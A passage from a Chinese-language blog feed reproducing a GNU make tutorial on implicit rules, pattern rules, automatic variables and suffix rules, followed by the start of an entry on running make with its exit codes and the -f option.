。</p></li><li><p>编译Fortran/Ratfor程序的隐含规则。</p><p><code>&lt;n&gt;.o</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.r</code> 或 <code>&lt;n&gt;.F</code> 或 <code>&lt;n&gt;.f</code> ，并且其生成命令是:</p><ul><li><code>.f</code> <code>$(FC) –c $(FFLAGS)</code></li><li><code>.F</code> <code>$(FC) –c $(FFLAGS) $(CPPFLAGS)</code></li><li><code>.f</code> <code>$(FC) –c $(FFLAGS) $(RFLAGS)</code></li></ul></li><li><p>预处理Fortran/Ratfor程序的隐含规则。</p><p><code>&lt;n&gt;.f</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.r</code> 或 <code>&lt;n&gt;.F</code> 。这个规则只是转换Ratfor 或有预处理的Fortran程序到一个标准的Fortran程序。其使用的命令是：</p><ul><li><code>.F</code> <code>$(FC) –F $(CPPFLAGS) $(FFLAGS)</code></li><li><code>.r</code> <code>$(FC) –F $(FFLAGS) $(RFLAGS)</code></li></ul></li><li><p>编译Modula-2程序的隐含规则。</p><p><code>&lt;n&gt;.sym</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.def</code> ，并且其生成命令是： <code>$(M2C) $(M2FLAGS) $(DEFFLAGS)</code> 。 <code>&lt;n&gt;.o</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.mod</code> ，并且其生成命令是： <code>$(M2C) $(M2FLAGS) $(MODFLAGS)</code> 。</p></li><li><p>汇编和汇编预处理的隐含规则。</p><p><code>&lt;n&gt;.o</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.s</code> ，默认使用编译器 <code>as</code> ，并且其生成命令是： <code>$ (AS) $(ASFLAGS)</code> 。 <code>&lt;n&gt;.s</code> 的目标的依赖目标会自动推导为 <code>&lt;n&gt;.S</code> ，默认使用C预编译器 <code>cpp</code> ，并且其生成命令是： <code>$(AS) $(ASFLAGS)</code> 。</p></li><li><p>链接Object文件的隐含规则。</p><p><code>&lt;n&gt;</code> 目标依赖于 <code>&lt;n&gt;.o</code> ，通过运行C的编译器来运行链接程序生成（一般是 <code>ld</code> ），其生成命令是： <code>$(CC) $(LDFLAGS) &lt;n&gt;.o $(LOADLIBES) $(LDLIBS)</code> 。这个规则对于只有一个源文件的工程有效，同时也对多个Object文件（由不同的源文件生成）的也有效。例如如下规则:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x : y.o z.o</span><br></pre></td></tr></table></figure><p>并且 <code>x.c</code> 、 <code>y.c</code> 和 <code>z.c</code> 都存在时，隐含规则将执行如下命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cc -c x.c -o x.o</span><br><span class="line">cc -c y.c -o y.o</span><br><span class="line">cc -c z.c -o z.o</span><br><span class="line">cc x.o y.o z.o -o x</span><br><span class="line">rm -f x.o</span><br><span class="line">rm -f y.o</span><br><span class="line">rm -f z.o</span><br></pre></td></tr></table></figure><p>如果没有一个源文件（如上例中的x.c）和你的目标名字（如上例中的x）相关联，那么，你最好写出自己的生成规则，不然，隐含规则会报错的。</p></li><li><p>Yacc C程序时的隐含规则。</p><p><code>&lt;n&gt;.c</code> 的依赖文件被自动推导为 <code>n.y</code> （Yacc生成的文件），其生成命令是： <code>$(YACC) $(YFALGS)</code> 。（“Yacc”是一个语法分析器，关于其细节请查看相关资料）</p></li><li><p>Lex C程序时的隐含规则。</p><p><code>&lt;n&gt;.c</code> 的依赖文件被自动推导为 <code>n.l</code> （Lex生成的文件），其生成命令是： <code>$(LEX) $(LFALGS)</code> 。（关于“Lex”的细节请查看相关资料）</p></li><li><p>Lex Ratfor程序时的隐含规则。</p><p><code>&lt;n&gt;.r</code> 的依赖文件被自动推导为 <code>n.l</code> （Lex生成的文件），其生成命令是： <code>$(LEX) $(LFALGS)</code> 。</p></li><li><p>从C程序、Yacc文件或Lex文件创建Lint库的隐含规则。</p><p><code>&lt;n&gt;.ln</code> （lint生成的文件）的依赖文件被自动推导为 <code>n.c</code> ，其生成命令是： <code>$(LINT) $(LINTFALGS) $(CPPFLAGS) -i</code> 。对于 <code>&lt;n&gt;.y</code> 和 <code>&lt;n&gt;.l</code> 也是同样的规则。</p></li></ol><h2 id="隐含规则使用的变量">隐含规则使用的变量<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id4">¶</a></h2><p>在隐含规则中的命令中，基本上都是使用了一些预先设置的变量。你可以在你的makefile中改变这些变量的值，或是在make的命令行中传入这些值，或是在你的环境变量中设置这些值，无论怎么样，只要设置了这些特定的变量，那么其就会对隐含规则起作用。当然，你也可以利用make的 <code>-R</code> 或 <code>--no–builtin-variables</code> 参数来取消你所定义的变量对隐含规则的作用。</p><p>例如，第一条隐含规则——编译C程序的隐含规则的命令是 <code>$(CC) –c $(CFLAGS) $(CPPFLAGS)</code> 。Make默认的编译命令是 <code>cc</code> ，如果你把变量 <code>$(CC)</code> 重定义成 <code>gcc</code> ，把变量 <code>$(CFLAGS)</code> 重定义成 <code>-g</code> ，那么，隐含规则中的命令全部会以 <code>gcc –c -g $(CPPFLAGS)</code> 的样子来执行了。</p><p>我们可以把隐含规则中使用的变量分成两种：一种是命令相关的，如 <code>CC</code> ；一种是参数相的关，如 <code>CFLAGS</code> 。下面是所有隐含规则中会用到的变量：</p><h3 id="关于命令的变量">关于命令的变量。<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id5">¶</a></h3><ul><li><code>AR</code> : 函数库打包程序。默认命令是 <code>ar</code></li><li><code>AS</code> : 汇编语言编译程序。默认命令是 <code>as</code></li><li><code>CC</code> : C语言编译程序。默认命令是 <code>cc</code></li><li><code>CXX</code> : C++语言编译程序。默认命令是 <code>g++</code></li><li><code>CO</code> : 从 RCS文件中扩展文件程序。默认命令是 <code>co</code></li><li><code>CPP</code> : C程序的预处理器（输出是标准输出设备）。默认命令是 <code>$(CC) –E</code></li><li><code>FC</code> : Fortran 和 Ratfor 的编译器和预处理程序。默认命令是 <code>f77</code></li><li><code>GET</code> : 从SCCS文件中扩展文件的程序。默认命令是 <code>get</code></li><li><code>LEX</code> : Lex方法分析器程序（针对于C或Ratfor）。默认命令是 <code>lex</code></li><li><code>PC</code> : Pascal语言编译程序。默认命令是 <code>pc</code></li><li><code>YACC</code> : Yacc文法分析器（针对于C程序）。默认命令是 <code>yacc</code></li><li><code>YACCR</code> : Yacc文法分析器（针对于Ratfor程序）。默认命令是 <code>yacc –r</code></li><li><code>MAKEINFO</code> : 转换Texinfo源文件（.texi）到Info文件程序。默认命令是 <code>makeinfo</code></li><li><code>TEX</code> : 从TeX源文件创建TeX DVI文件的程序。默认命令是 <code>tex</code></li><li><code>TEXI2DVI</code> : 从Texinfo源文件创建军TeX DVI 文件的程序。默认命令是 <code>texi2dvi</code></li><li><code>WEAVE</code> : 转换Web到TeX的程序。默认命令是 <code>weave</code></li><li><code>CWEAVE</code> : 转换C Web 到 TeX的程序。默认命令是 <code>cweave</code></li><li><code>TANGLE</code> : 转换Web到Pascal语言的程序。默认命令是 <code>tangle</code></li><li><code>CTANGLE</code> : 转换C Web 到 C。默认命令是 <code>ctangle</code></li><li><code>RM</code> : 删除文件命令。默认命令是 <code>rm –f</code></li></ul><h3 id="关于命令参数的变量">关于命令参数的变量<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id6">¶</a></h3><p>下面的这些变量都是相关上面的命令的参数。如果没有指明其默认值，那么其默认值都是空。</p><ul><li><code>ARFLAGS</code> : 函数库打包程序AR命令的参数。默认值是 <code>rv</code></li><li><code>ASFLAGS</code> : 汇编语言编译器参数。（当明显地调用 <code>.s</code> 或 <code>.S</code> 文件时）</li><li><code>CFLAGS</code> : C语言编译器参数。</li><li><code>CXXFLAGS</code> : C++语言编译器参数。</li><li><code>COFLAGS</code> : RCS命令参数。</li><li><code>CPPFLAGS</code> : C预处理器参数。（ C 和 Fortran 编译器也会用到）。</li><li><code>FFLAGS</code> : Fortran语言编译器参数。</li><li><code>GFLAGS</code> : SCCS “get”程序参数。</li><li><code>LDFLAGS</code> : 链接器参数。（如： <code>ld</code> ）</li><li><code>LFLAGS</code> : Lex文法分析器参数。</li><li><code>PFLAGS</code> : Pascal语言编译器参数。</li><li><code>RFLAGS</code> : Ratfor 程序的Fortran 编译器参数。</li><li><code>YFLAGS</code> : Yacc文法分析器参数。</li></ul><h2 id="隐含规则链">隐含规则链<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id7">¶</a></h2><p>有些时候，一个目标可能被一系列的隐含规则所作用。例如，一个 <code>.o</code> 的文件生成，可能会是先被 Yacc的[.y]文件先成 <code>.c</code> ，然后再被C的编译器生成。我们把这一系列的隐含规则叫做“隐含规则链”。</p><p>在上面的例子中，如果文件 <code>.c</code> 存在，那么就直接调用C的编译器的隐含规则，如果没有 <code>.c</code> 文件，但有一个 <code>.y</code> 文件，那么Yacc的隐含规则会被调用，生成 <code>.c</code> 文件，然后，再调用C编译的隐含规则最终由 <code>.c</code> 生成 <code>.o</code> 文件，达到目标。</p><p>我们把这种 <code>.c</code> 的文件（或是目标），叫做中间目标。不管怎么样，make会努力自动推导生成目标的一切方法，不管中间目标有多少，其都会执着地把所有的隐含规则和你书写的规则全部合起来分析，努力达到目标，所以，有些时候，可能会让你觉得奇怪，怎么我的目标会这样生成？怎么我的 makefile发疯了？</p><p>在默认情况下，对于中间目标，它和一般的目标有两个地方所不同：第一个不同是除非中间的目标不存在，才会引发中间规则。第二个不同的是，只要目标成功产生，那么，产生最终目标过程中，所产生的中间目标文件会被以 <code>rm -f</code> 删除。</p><p>通常，一个被makefile指定成目标或是依赖目标的文件不能被当作中介。然而，你可以明显地说明一个文件或是目标是中介目标，你可以使用伪目标 <code>.INTERMEDIATE</code> 来强制声明。（如： <code>.INTERMEDIATE : mid</code> ）</p><p>你也可以阻止make自动删除中间目标，要做到这一点，你可以使用伪目标 <code>.SECONDARY</code> 来强制声明（如： <code>.SECONDARY : sec</code> ）。你还可以把你的目标，以模式的方式来指定（如： <code>%.o</code> ）成伪目标 <code>.PRECIOUS</code> 的依赖目标，以保存被隐含规则所生成的中间文件。</p><p>在“隐含规则链”中，禁止同一个目标出现两次或两次以上，这样一来，就可防止在make自动推导时出现无限递归的情况。</p><p>Make会优化一些特殊的隐含规则，而不生成中间文件。如，从文件 <code>foo.c</code> 生成目标程序 <code>foo</code> ，按道理，make会编译生成中间文件 <code>foo.o</code> ，然后链接成 <code>foo</code> ，但在实际情况下，这一动作可以被一条 <code>cc</code> 的命令完成（ <code>cc –o foo foo.c</code> ），于是优化过的规则就不会生成中间文件。</p><h2 id="定义模式规则">定义模式规则<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id8">¶</a></h2><p>你可以使用模式规则来定义一个隐含规则。一个模式规则就好像一个一般的规则，只是在规则中，目标的定义需要有 <code>%</code> 字符。 <code>%</code> 的意思是表示一个或多个任意字符。在依赖目标中同样可以使用 <code>%</code> ，只是依赖目标中的 <code>%</code> 的取值，取决于其目标。</p><p>有一点需要注意的是， <code>%</code> 的展开发生在变量和函数的展开之后，变量和函数的展开发生在make载入 Makefile时，而模式规则中的 <code>%</code> 则发生在运行时。</p><h3 id="模式规则介绍">模式规则介绍<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id9">¶</a></h3><p>模式规则中，至少在规则的目标定义中要包含 <code>%</code> ，否则，就是一般的规则。目标中的 <code>%</code> 定义表示对文件名的匹配， <code>%</code> 表示长度任意的非空字符串。例如： <code>%.c</code> 表示以 <code>.c</code> 结尾的文件名（文件名的长度至少为3），而 <code>s.%.c</code> 则表示以 <code>s.</code> 开头， <code>.c</code> 结尾的文件名（文件名的长度至少为5）。</p><p>如果 <code>%</code> 定义在目标中，那么，依赖中的 <code>%</code> 的值决定了目标中的 <code>%</code> 的值，也就是说，依赖中的模式的 <code>%</code> 决定了目标中 <code>%</code> 的样子。例如有一个模式规则如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c ; &lt;command ......&gt;;</span><br></pre></td></tr></table></figure><p>其含义是，指出了怎么从所有的 <code>.c</code> 文件生成相应的 <code>.o</code> 文件的规则。如果要生成的目标是 <code>a.o b.o</code> ，那么 <code>%c</code> 就是 <code>a.c b.c</code> 。</p><p>一旦依赖目标中的 <code>%</code> 模式被确定，那么，make会被要求去匹配当前目录下所有的文件名，一旦找到，make就会规则下的命令，所以，在模式规则中，目标可能会是多个的，如果有模式匹配出多个目标，make就会产生所有的模式目标，此时，make关心的是依赖的文件名和生成目标的命令这两件事。</p><h3 id="模式规则示例">模式规则示例<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id10">¶</a></h3><p>下面这个例子表示了,把所有的 <code>.c</code> 文件都编译成 <code>.o</code> 文件.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c</span><br><span class="line">    $(CC) -c $(CFLAGS) $(CPPFLAGS) $&lt; -o $@</span><br></pre></td></tr></table></figure><p>其中， <code>$@</code> 表示所有的目标的挨个值， <code>$&lt;</code> 表示了所有依赖目标的挨个值。这些奇怪的变量我们叫“自动化变量”，后面会详细讲述。</p><p>下面的这个例子中有两个目标是模式的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.tab.c %.tab.h: %.y</span><br><span class="line">    bison -d $&lt;</span><br></pre></td></tr></table></figure><p>这条规则告诉make把所有的 <code>.y</code> 文件都以 <code>bison -d &lt;n&gt;.y</code> 执行，然后生成 <code>&lt;n&gt;.tab.c</code> 和 <code>&lt;n&gt;.tab.h</code> 文件。（其中， <code>&lt;n&gt;</code> 表示一个任意字符串）。如果我们的执行程序 <code>foo</code> 依赖于文件 <code>parse.tab.o</code> 和 <code>scan.o</code> ，并且文件 <code>scan.o</code> 依赖于文件 <code>parse.tab.h</code> ，如果 <code>parse.y</code> 文件被更新了，那么根据上述的规则， <code>bison -d parse.y</code> 就会被执行一次，于是， <code>parse.tab.o</code> 和 <code>scan.o</code> 的依赖文件就齐了。（假设， <code>parse.tab.o</code> 由 <code>parse.tab.c</code> 生成，和 <code>scan.o</code> 由 <code>scan.c</code> 生成，而 <code>foo</code> 由 <code>parse.tab.o</code> 和 <code>scan.o</code> 链接生成，而且 <code>foo</code> 和其 <code>.o</code> 文件的依赖关系也写好，那么，所有的目标都会得到满足）</p><h3 id="自动化变量">自动化变量<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id11">¶</a></h3><p>在上述的模式规则中，目标和依赖文件都是一系例的文件，那么我们如何书写一个命令来完成从不同的依赖文件生成相应的目标？因为在每一次的对模式规则的解析时，都会是不同的目标和依赖文件。</p><p>自动化变量就是完成这个功能的。在前面，我们已经对自动化变量有所提涉，相信你看到这里已对它有一个感性认识了。所谓自动化变量，就是这种变量会把模式中所定义的一系列的文件自动地挨个取出，直至所有的符合模式的文件都取完了。这种自动化变量只应出现在规则的命令中。</p><p>下面是所有的自动化变量及其说明：</p><ul><li><code>$@</code> : 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么， <code>$@</code> 就是匹配于目标中模式定义的集合。</li><li><code>$%</code> : 仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是 <code>foo.a(bar.o)</code> ，那么， <code>$%</code> 就是 <code>bar.o</code> ， <code>$@</code> 就是 <code>foo.a</code> 。如果目标不是函数库文件（Unix下是 <code>.a</code> ，Windows下是 <code>.lib</code> ），那么，其值为空。</li><li><code>$&lt;</code> : 依赖目标中的第一个目标名字。如果依赖目标是以模式（即 <code>%</code> ）定义的，那么 <code>$&lt;</code> 将是符合模式的一系列的文件集。注意，其是一个一个取出来的。</li><li><code>$?</code> : 所有比目标新的依赖目标的集合。以空格分隔。</li><li><code>$^</code> : 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那么这个变量会去除重复的依赖目标，只保留一份。</li><li><code>$+</code> : 这个变量很像 <code>$^</code> ，也是所有依赖目标的集合。只是它不去除重复的依赖目标。</li><li><code>$*</code> : 这个变量表示目标模式中 <code>%</code> 及其之前的部分。如果目标是 <code>dir/a.foo.b</code> ，并且目标的模式是 <code>a.%.b</code> ，那么， <code>$*</code> 的值就是 <code>dir/foo</code> 。这个变量对于构造有关联的文件名是比较有效。如果目标中没有模式的定义，那么 <code>$*</code> 也就不能被推导出，但是，如果目标文件的后缀是make所识别的，那么 <code>$*</code> 就是除了后缀的那一部分。例如：如果目标是 <code>foo.c</code> ，因为 <code>.c</code> 是make所能识别的后缀名，所以， <code>$*</code> 的值就是 <code>foo</code> 。这个特性是GNU make的，很有可能不兼容于其它版本的make，所以，你应该尽量避免使用 <code>$*</code> ，除非是在隐含规则或是静态模式中。如果目标中的后缀是make所不能识别的，那么 <code>$*</code> 就是空值。</li></ul><p>当你希望只对更新过的依赖文件进行操作时， <code>$?</code> 在显式规则中很有用，例如，假设有一个函数库文件叫 <code>lib</code> ，其由其它几个object文件更新。那么把object文件打包的比较有效率的Makefile规则是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lib : foo.o bar.o lose.o win.o</span><br><span class="line">    ar r lib $?</span><br></pre></td></tr></table></figure><p>在上述所列出来的自动量变量中。四个变量（ <code>$@</code> 、 <code>$&lt;</code> 、 <code>$%</code> 、 <code>$*</code> ）在扩展时只会有一个文件，而另三个的值是一个文件列表。这七个自动化变量还可以取得文件的目录名或是在当前目录下的符合模式的文件名，只需要搭配上 <code>D</code> 或 <code>F</code> 字样。这是GNU make中老版本的特性，在新版本中，我们使用函数 <code>dir</code> 或 <code>notdir</code> 就可以做到了。 <code>D</code> 的含义就是Directory，就是目录， <code>F</code> 的含义就是File，就是文件。</p><p>下面是对于上面的七个变量分别加上 <code>D</code> 或是 <code>F</code> 的含义：</p><ul><li><p><code>$(@D)</code></p><p>表示 <code>$@</code> 的目录部分（不以斜杠作为结尾），如果 <code>$@</code> 值是 <code>dir/foo.o</code> ，那么 <code>$(@D)</code> 就是 <code>dir</code> ，而如果 <code>$@</code> 中没有包含斜杠的话，其值就是 <code>.</code> （当前目录）。</p></li><li><p><code>$(@F)</code></p><p>表示 <code>$@</code> 的文件部分，如果 <code>$@</code> 值是 <code>dir/foo.o</code> ，那么 <code>$(@F)</code> 就是 <code>foo.o</code> ， <code>$(@F)</code> 相当于函数 <code>$(notdir $@)</code> 。</p></li><li><p><code>$(*D)</code>, <code>$(*F)</code></p><p>和上面所述的同理，也是取文件的目录部分和文件部分。对于上面的那个例子， <code>$(*D)</code> 返回 <code>dir</code> ，而 <code>$(*F)</code> 返回 <code>foo</code></p></li><li><p><code>$(%D)</code>, <code>$(%F)</code></p><p>分别表示了函数包文件成员的目录部分和文件部分。这对于形同 <code>archive(member)</code> 形式的目标中的 <code>member</code> 中包含了不同的目录很有用。</p></li><li><p><code>$(&lt;D)</code>, <code>$(&lt;F)</code></p><p>分别表示依赖文件的目录部分和文件部分。</p></li><li><p><code>$(^D)</code>, <code>$(^F)</code></p><p>分别表示所有依赖文件的目录部分和文件部分。（无相同的）</p></li><li><p><code>$(+D)</code>, <code>$(+F)</code></p><p>分别表示所有依赖文件的目录部分和文件部分。（可以有相同的）</p></li><li><p><code>$(?D)</code>, <code>$(?F)</code></p><p>分别表示被更新的依赖文件的目录部分和文件部分。</p></li></ul><p>最后想提醒一下的是，对于 <code>$&lt;</code> ，为了避免产生不必要的麻烦，我们最好给 <code>$</code> 后面的那个特定字符都加上圆括号，比如， <code>$(&lt;)</code> 就要比 <code>$&lt;</code> 要好一些。</p><p>还得要注意的是，这些变量只使用在规则的命令中，而且一般都是“显式规则”和“静态模式规则”（参见前面“书写规则”一章）。其在隐含规则中并没有意义。</p><h3 id="模式的匹配">模式的匹配<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id12">¶</a></h3><p>一般来说，一个目标的模式有一个有前缀或是后缀的 <code>%</code> ，或是没有前后缀，直接就是一个 <code>%</code> 。因为 <code>%</code> 代表一个或多个字符，所以在定义好了的模式中，我们把 <code>%</code> 所匹配的内容叫做“茎”，例如 <code>%.c</code> 所匹配的文件“test.c”中“test”就是“茎”。因为在目标和依赖目标中同时有 <code>%</code> 时，依赖目标的“茎”会传给目标，当做目标中的“茎”。</p><p>当一个模式匹配包含有斜杠（实际也不经常包含）的文件时，那么在进行模式匹配时，目录部分会首先被移开，然后进行匹配，成功后，再把目录加回去。在进行“茎”的传递时，我们需要知道这个步骤。例如有一个模式 <code>e%t</code> ，文件 <code>src/eat</code> 匹配于该模式，于是 <code>src/a</code> 就是其“茎”，如果这个模式定义在依赖目标中，而被依赖于这个模式的目标中又有个模式 <code>c%r</code> ，那么，目标就是 <code>src/car</code> 。（“茎”被传递）</p><h3 id="重载内建隐含规则">重载内建隐含规则<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id13">¶</a></h3><p>你可以重载内建的隐含规则（或是定义一个全新的），例如你可以重新构造和内建隐含规则不同的命令，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.c</span><br><span class="line">    $(CC) -c $(CPPFLAGS) $(CFLAGS) -D$(date)</span><br></pre></td></tr></table></figure><p>你可以取消内建的隐含规则，只要不在后面写命令就行。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%.o : %.s</span><br></pre></td></tr></table></figure><p>同样，你也可以重新定义一个全新的隐含规则，其在隐含规则中的位置取决于你在哪里写下这个规则。朝前的位置就靠前。</p><h2 id="老式风格的后缀规则">老式风格的“后缀规则”<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id14">¶</a></h2><p>后缀规则是一个比较老式的定义隐含规则的方法。后缀规则会被模式规则逐步地取代。因为模式规则更强更清晰。为了和老版本的Makefile兼容，GNU make同样兼容于这些东西。后缀规则有两种方式：“双后缀”和“单后缀”。</p><p>双后缀规则定义了一对后缀：目标文件的后缀和依赖目标（源文件）的后缀。如 <code>.c.o</code> 相当于 <code>%o : %c</code> 。单后缀规则只定义一个后缀，也就是源文件的后缀。如 <code>.c</code> 相当于 <code>% : %.c</code> 。</p><p>后缀规则中所定义的后缀应该是make所认识的，如果一个后缀是make所认识的，那么这个规则就是单后缀规则，而如果两个连在一起的后缀都被make所认识，那就是双后缀规则。例如： <code>.c</code> 和 <code>.o</code> 都是make所知道。因而，如果你定义了一个规则是 <code>.c.o</code> 那么其就是双后缀规则，意义就是 <code>.c</code> 是源文件的后缀， <code>.o</code> 是目标文件的后缀。如下示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.c.o:</span><br><span class="line">    $(CC) -c $(CFLAGS) $(CPPFLAGS) -o $@ $&lt;</span><br></pre></td></tr></table></figure><p>后缀规则不允许任何的依赖文件，如果有依赖文件的话，那就不是后缀规则，那些后缀统统被认为是文件名，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.c.o: foo.h</span><br><span class="line">    $(CC) -c $(CFLAGS) $(CPPFLAGS) -o $@ $&lt;</span><br></pre></td></tr></table></figure><p>这个例子，就是说，文件 <code>.c.o</code> 依赖于文件 <code>foo.h</code> ，而不是我们想要的这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%.o: %.c foo.h</span><br><span class="line">    $(CC) -c $(CFLAGS) $(CPPFLAGS) -o $@ $&lt;</span><br></pre></td></tr></table></figure><p>后缀规则中，如果没有命令，那是毫无意义的。因为他也不会移去内建的隐含规则。</p><p>而要让make知道一些特定的后缀，我们可以使用伪目标 <code>.SUFFIXES</code> 来定义或是删除，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.SUFFIXES: .hack .win</span><br></pre></td></tr></table></figure><p>把后缀 <code>.hack</code> 和 <code>.win</code> 加入后缀列表中的末尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.SUFFIXES:              # 删除默认的后缀</span><br><span class="line">.SUFFIXES: .c .o .h   # 定义自己的后缀</span><br></pre></td></tr></table></figure><p>先清除默认后缀，后定义自己的后缀列表。</p><p>make的参数 <code>-r</code> 或 <code>-no-builtin-rules</code> 也会使用得默认的后缀列表为空。而变量 <code>SUFFIXE</code> 被用来定义默认的后缀列表，你可以用 <code>.SUFFIXES</code> 来改变后缀列表，但请不要改变变量 <code>SUFFIXE</code> 的值。</p><h2 id="隐含规则搜索算法">隐含规则搜索算法<a href="https://seisman.github.io/how-to-write-makefile/implicit_rules.html#id15">¶</a></h2><p>比如我们有一个目标叫 T。下面是搜索目标T的规则的算法。请注意，在下面，我们没有提到后缀规则，原因是，所有的后缀规则在Makefile被载入内存时，会被转换成模式规则。如果目标是 <code>archive(member)</code> 的函数库文件模式，那么这个算法会被运行两次，第一次是找目标T，如果没有找到的话，那么进入第二次，第二次会把 <code>member</code> 当作T来搜索。</p><ol><li>把T的目录部分分离出来。叫D，而剩余部分叫N。（如：如果T是 <code>src/foo.o</code> ，那么，D就是 <code>src/</code> ，N就是 <code>foo.o</code> ）</li><li>创建所有匹配于T或是N的模式规则列表。</li><li>如果在模式规则列表中有匹配所有文件的模式，如 <code>%</code> ，那么从列表中移除其它的模式。</li><li>移除列表中没有命令的规则。</li><li>对于第一个在列表中的模式规则：<ol><li>推导其“茎”S，S应该是T或是N匹配于模式中 <code>%</code> 非空的部分。</li><li>计算依赖文件。把依赖文件中的 <code>%</code> 都替换成“茎”S。如果目标模式中没有包含斜框字符，而把D加在第一个依赖文件的开头。</li><li>测试是否所有的依赖文件都存在或是理当存在。（如果有一个文件被定义成另外一个规则的目标文件，或者是一个显式规则的依赖文件，那么这个文件就叫“理当存在”）</li><li>如果所有的依赖文件存在或是理当存在，或是就没有依赖文件。那么这条规则将被采用，退出该算法。</li></ol></li><li>如果经过第5步，没有模式规则被找到，那么就做更进一步的搜索。对于存在于列表中的第一个模式规则：<ol><li>如果规则是终止规则，那就忽略它，继续下一条模式规则。</li><li>计算依赖文件。（同第5步）</li><li>测试所有的依赖文件是否存在或是理当存在。</li><li>对于不存在的依赖文件，递归调用这个算法查找他是否可以被隐含规则找到。</li><li>如果所有的依赖文件存在或是理当存在，或是就根本没有依赖文件。那么这条规则被采用，退出该算法。</li><li>如果没有隐含规则可以使用，查看 <code>.DEFAULT</code> 规则，如果有，采用，把 <code>.DEFAULT</code> 的命令给T使用。</li></ol></li></ol><p>一旦规则被找到，就会执行其相当的命令，而此时，我们的自动化变量的值才会生成。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>make运行</title>
      <link href="/2024/04/26/Security/binary/Makefile/7.make%E7%9A%84%E8%BF%90%E8%A1%8C/"/>
      <url>/2024/04/26/Security/binary/Makefile/7.make%E7%9A%84%E8%BF%90%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="make-运行">make 运行<a href="https://seisman.github.io/how-to-write-makefile/invoke.html#make">¶</a></h1><p>一般来说，最简单的就是直接在命令行下输入make命令，make命令会找当前目录的makefile来执行，一切都是自动的。但也有时你也许只想让make重编译某些文件，而不是整个工程，而又有的时候你有几套编译规则，你想在不同的时候使用不同的编译规则，等等。本章节就是讲述如何使用make命令的。</p><h2 id="make的退出码">make的退出码<a href="https://seisman.github.io/how-to-write-makefile/invoke.html#id1">¶</a></h2><p>make命令执行后有三个退出码：</p><ul><li><p>0</p><p>表示成功执行。</p></li><li><p>1</p><p>如果make运行时出现任何错误，其返回1。</p></li><li><p>2</p><p>如果你使用了make的“-q”选项，并且make使得一些目标不需要更新，那么返回2。</p></li></ul><p>Make的相关参数我们会在后续章节中讲述。</p><h2 id="指定makefile">指定Makefile<a href="https://seisman.github.io/how-to-write-makefile/invoke.html#makefile">¶</a></h2><p>前面我们说过，GNU make找寻默认的Makefile的规则是在当前目录下依次找三个文件——“GNUmakefile”、“makefile”和“Makefile”。其按顺序找这三个文件，一旦找到，就开始读取这个文件并执行。</p><p>当前，我们也可以给make命令指定一个特殊名字的Makefile。要达到这个功能，我们要使用make的 <code>-f</code> 或是 <code>--file</code> 参数（ <code>--makefile</code> 参数也行）。例如，我们有个makefile的名字是“<a href="http://hchen.mk">hchen.mk</a>”，那么，我们可以这样来让make来执行这个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make –f hchen.mk</span><br></pre></td></tr></table></figure><p>如果在make的命令行是，你不只一次地使用了 <code>-f</code> 参数，那么，所有指定的makefile将会被连在一起传递给make执行。</p><h2 id="指定目标">指定目标<a 